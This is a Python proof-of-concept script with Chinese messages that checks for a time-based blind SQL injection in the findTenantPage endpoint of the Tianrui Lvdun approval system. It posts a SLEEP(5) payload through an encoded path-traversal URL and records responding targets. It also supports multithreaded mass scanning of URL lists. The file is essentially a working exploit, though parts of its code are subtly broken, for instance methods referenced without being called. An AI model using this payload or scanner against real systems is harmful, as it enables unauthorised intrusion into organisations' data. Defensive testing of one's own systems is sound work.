import requests,argparse,sys,random
from multiprocessing.dummy import Pool

# 随机UA头
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]
i=random.choice(USER_AGENTS)

headers={
    "Content-Type": "application/x-www-form-urlencoded"
}
# payload
data="""sort=(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)"""

link="/trwfe/service/.%2E/invoker/findTenantPage.do"
def poc(target):
    try:
        res1=requests.get(url=target,headers=headers,verify=False)
        if res1.status_code==200:
            res2=requests.post(url=target+link,headers=headers,data=data,verify=False)
            if res2.status_code==200 and res2.elapsed.total_seconds-res1.elapsed.total_seconds>=4 and res2.elapsed.total_seconds>=5:
                print("[+]存在漏洞")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(f"{target}\n")

            else:
                print("[-]未检测出漏洞")
        else:
            print("[*]连接出错，请手工检测")
    except:
        pass

def main():

    parse=argparse.ArgumentParser(description="天锐绿盾审批系统findTenantPage的sql注入检测脚本")
    parse.add_argument('-u','--url',dest="url",type=str,help="输入测试网站的url：http://xxx.com")
    parse.add_argument('-f','--file',dest="file",type=str,help="批量扫描的文件路径，每行一个")
    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"请输入：python{sys.argv[0]} -h")

if __name__ == "__main__":
    main()



